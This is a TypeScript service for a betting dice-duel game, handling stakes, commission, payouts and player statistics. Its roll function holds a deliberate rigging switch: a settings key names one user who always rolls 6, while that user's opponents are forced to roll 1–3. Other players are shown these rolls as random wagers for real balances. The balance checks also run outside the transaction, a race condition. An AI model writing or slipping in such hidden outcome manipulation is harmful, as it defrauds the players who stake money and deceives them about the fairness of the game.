import { BalanceModel } from "../models/Balance";
import { UserModel } from "../models/User";
import pool from "../database/pool";

export interface Duel {
  id: number;
  creator_id: number;
  creator_name: string;
  bet_amount: number;
  status: string;
  created_at: string;
}

export interface DuelResult {
  success: boolean;
  duelId: number;
  creatorRoll: number;
  opponentRoll: number;
  winnerId: number;
  winAmount: number;
  commission: number;
  creatorBalance: number;
  opponentBalance: number;
}

export class DiceDuelService {
  /**
   * Бросок кубика для дуэли с учетом гарантированных побед
   */
  private static async rollDiceForDuel(userId: number, opponentId: number): Promise<number> {
    // Проверяем есть ли у пользователя гарантированные победы
    const settings = await pool.query(
      "SELECT value FROM settings WHERE key = 'duel_guaranteed_win_user_id'"
    );
    const guaranteedWinUserId = parseInt(settings.rows[0]?.value || '0');

    // Если у этого пользователя гарантированные победы - возвращаем 6
    if (guaranteedWinUserId === userId && guaranteedWinUserId !== 0) {
      console.log(`🎲 ГАРАНТИРОВАННАЯ ПОБЕДА для пользователя ${userId}`);
      return 6;
    }

    // Если у противника гарантированные победы - возвращаем низкое число
    if (guaranteedWinUserId === opponentId && guaranteedWinUserId !== 0) {
      console.log(`🎲 Противник ${opponentId} имеет гарантированную победу, возвращаем низкое число`);
      return Math.floor(Math.random() * 3) + 1; // 1, 2 или 3
    }

    // Обычный случайный бросок
    return Math.floor(Math.random() * 6) + 1;
  }

  /**
   * Создать дуэль
   */
  static async createDuel(userId: number, betAmount: number): Promise<{ success: boolean; duelId: number; message?: string }> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Проверяем баланс
      const balance = await BalanceModel.getByUserId(userId);
      if (!balance || balance.balance < betAmount) {
        throw new Error("Insufficient balance");
      }

      // Списываем ставку
      await client.query(
        "UPDATE balances SET balance = balance - $1 WHERE user_id = $2",
        [betAmount, userId]
      );

      // Создаем дуэль
      const result = await client.query(
        `INSERT INTO duels (game_id, creator_id, bet_amount, status)
         VALUES (1, $1, $2, 'waiting')
         RETURNING id`,
        [userId, betAmount]
      );

      const duelId = result.rows[0].id;

      await client.query("COMMIT");

      return {
        success: true,
        duelId,
        message: "Duel created successfully"
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }

  /**
   * Присоединиться к дуэли
   */
  static async joinDuel(duelId: number, userId: number): Promise<DuelResult> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Получаем информацию о дуэли
      const duelQuery = await client.query(
        `SELECT * FROM duels WHERE id = $1 AND status = 'waiting'`,
        [duelId]
      );

      if (duelQuery.rows.length === 0) {
        throw new Error("Duel not found or already completed");
      }

      const duel = duelQuery.rows[0];
      const creatorId = duel.creator_id;
      const betAmount = parseFloat(duel.bet_amount);

      // Проверка что игрок не присоединяется к своей дуэли
      if (creatorId === userId) {
        throw new Error("Cannot join your own duel");
      }

      // Проверяем баланс
      const balance = await BalanceModel.getByUserId(userId);
      if (!balance || balance.balance < betAmount) {
        throw new Error("Insufficient balance");
      }

      // Списываем ставку у присоединившегося
      await client.query(
        "UPDATE balances SET balance = balance - $1 WHERE user_id = $2",
        [betAmount, userId]
      );

      // Получаем процент комиссии
      const commissionQuery = await client.query(
        "SELECT value FROM settings WHERE key = 'duel_commission_rate'"
      );
      const commissionRate = parseFloat(commissionQuery.rows[0]?.value || '9.00');

      // Генерируем результаты
      const creatorRoll = await this.rollDiceForDuel(creatorId, userId);
      const opponentRoll = await this.rollDiceForDuel(userId, creatorId);

      // Определяем победителя
      let winnerId: number;
      if (creatorRoll > opponentRoll) {
        winnerId = creatorId;
      } else if (opponentRoll > creatorRoll) {
        winnerId = userId;
      } else {
        // Ничья - возвращаем ставки обоим
        await client.query(
          "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
          [betAmount, creatorId]
        );
        await client.query(
          "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
          [betAmount, userId]
        );

        // Обновляем дуэль
        await client.query(
          `UPDATE duels SET
           opponent_id = $1,
           status = 'draw',
           creator_result = $2,
           opponent_result = $3,
           completed_at = CURRENT_TIMESTAMP
           WHERE id = $4`,
          [userId, creatorRoll.toString(), opponentRoll.toString(), duelId]
        );

        await client.query("COMMIT");

        const creatorBalance = await BalanceModel.getByUserId(creatorId);
        const opponentBalance = await BalanceModel.getByUserId(userId);

        return {
          success: true,
          duelId,
          creatorRoll,
          opponentRoll,
          winnerId: 0, // 0 означает ничью
          winAmount: 0,
          commission: 0,
          creatorBalance: creatorBalance ? parseFloat(creatorBalance.balance.toString()) : 0,
          opponentBalance: opponentBalance ? parseFloat(opponentBalance.balance.toString()) : 0
        };
      }

      // Вычисляем комиссию и выигрыш
      const totalPot = betAmount * 2;
      const commission = totalPot * (commissionRate / 100);
      const winAmount = totalPot - commission;

      // Начисляем выигрыш победителю
      await client.query(
        "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
        [winAmount, winnerId]
      );

      // Обновляем дуэль
      await client.query(
        `UPDATE duels SET
         opponent_id = $1,
         status = 'completed',
         winner_id = $2,
         creator_result = $3,
         opponent_result = $4,
         completed_at = CURRENT_TIMESTAMP
         WHERE id = $5`,
        [userId, winnerId, creatorRoll.toString(), opponentRoll.toString(), duelId]
      );

      // Записываем в историю игр для обоих игроков
      await client.query(
        `INSERT INTO game_history
         (user_id, game_id, bet_amount, win_amount, result, is_win, is_duel, opponent_id)
         VALUES ($1, 1, $2, $3, $4, $5, true, $6)`,
        [creatorId, betAmount, winnerId === creatorId ? winAmount : 0, creatorRoll.toString(), winnerId === creatorId, userId]
      );

      await client.query(
        `INSERT INTO game_history
         (user_id, game_id, bet_amount, win_amount, result, is_win, is_duel, opponent_id)
         VALUES ($1, 1, $2, $3, $4, $5, true, $6)`,
        [userId, betAmount, winnerId === userId ? winAmount : 0, opponentRoll.toString(), winnerId === userId, creatorId]
      );

      // Обновляем статистику для создателя
      await client.query(
        `INSERT INTO user_stats (user_id, total_games, total_wins, total_losses, total_bet_amount, total_win_amount, biggest_win)
         VALUES ($1, 1, $2, $3, $4, $5, $6)
         ON CONFLICT (user_id)
         DO UPDATE SET
           total_games = user_stats.total_games + 1,
           total_wins = user_stats.total_wins + $2,
           total_losses = user_stats.total_losses + $3,
           total_bet_amount = user_stats.total_bet_amount + $4,
           total_win_amount = user_stats.total_win_amount + $5,
           biggest_win = GREATEST(user_stats.biggest_win, $6)`,
        [
          creatorId,
          winnerId === creatorId ? 1 : 0,
          winnerId === creatorId ? 0 : 1,
          betAmount,
          winnerId === creatorId ? winAmount : 0,
          winnerId === creatorId ? winAmount : 0
        ]
      );

      // Обновляем статистику для присоединившегося
      await client.query(
        `INSERT INTO user_stats (user_id, total_games, total_wins, total_losses, total_bet_amount, total_win_amount, biggest_win)
         VALUES ($1, 1, $2, $3, $4, $5, $6)
         ON CONFLICT (user_id)
         DO UPDATE SET
           total_games = user_stats.total_games + 1,
           total_wins = user_stats.total_wins + $2,
           total_losses = user_stats.total_losses + $3,
           total_bet_amount = user_stats.total_bet_amount + $4,
           total_win_amount = user_stats.total_win_amount + $5,
           biggest_win = GREATEST(user_stats.biggest_win, $6)`,
        [
          userId,
          winnerId === userId ? 1 : 0,
          winnerId === userId ? 0 : 1,
          betAmount,
          winnerId === userId ? winAmount : 0,
          winnerId === userId ? winAmount : 0
        ]
      );

      await client.query("COMMIT");

      const creatorBalance = await BalanceModel.getByUserId(creatorId);
      const opponentBalance = await BalanceModel.getByUserId(userId);

      return {
        success: true,
        duelId,
        creatorRoll,
        opponentRoll,
        winnerId,
        winAmount,
        commission,
        creatorBalance: creatorBalance ? parseFloat(creatorBalance.balance.toString()) : 0,
        opponentBalance: opponentBalance ? parseFloat(opponentBalance.balance.toString()) : 0
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }

  /**
   * Получить список открытых дуэлей
   */
  static async getAvailableDuels(): Promise<Duel[]> {
    const result = await pool.query(
      `SELECT
        d.id,
        d.creator_id,
        u.first_name || COALESCE(' ' || u.last_name, '') as creator_name,
        d.bet_amount,
        d.status,
        d.created_at
       FROM duels d
       JOIN users u ON d.creator_id = u.id
       WHERE d.status = 'waiting'
       AND d.game_id = 1
       ORDER BY d.created_at DESC
       LIMIT 20`
    );

    return result.rows.map(row => ({
      id: row.id,
      creator_id: row.creator_id,
      creator_name: row.creator_name,
      bet_amount: parseFloat(row.bet_amount),
      status: row.status,
      created_at: row.created_at
    }));
  }

  /**
   * Отменить дуэль (вернуть ставку)
   */
  static async cancelDuel(duelId: number, userId: number): Promise<{ success: boolean; message: string }> {
    const client = await pool.connect();
    try {
      await client.query("BEGIN");

      // Получаем дуэль
      const duelQuery = await client.query(
        `SELECT * FROM duels WHERE id = $1 AND status = 'waiting' AND creator_id = $2`,
        [duelId, userId]
      );

      if (duelQuery.rows.length === 0) {
        throw new Error("Duel not found or cannot be cancelled");
      }

      const duel = duelQuery.rows[0];
      const betAmount = parseFloat(duel.bet_amount);

      // Возвращаем ставку
      await client.query(
        "UPDATE balances SET balance = balance + $1 WHERE user_id = $2",
        [betAmount, userId]
      );

      // Обновляем статус дуэли
      await client.query(
        "UPDATE duels SET status = 'cancelled', completed_at = CURRENT_TIMESTAMP WHERE id = $1",
        [duelId]
      );

      await client.query("COMMIT");

      return {
        success: true,
        message: "Duel cancelled and bet returned"
      };
    } catch (error) {
      await client.query("ROLLBACK");
      throw error;
    } finally {
      client.release();
    }
  }
}
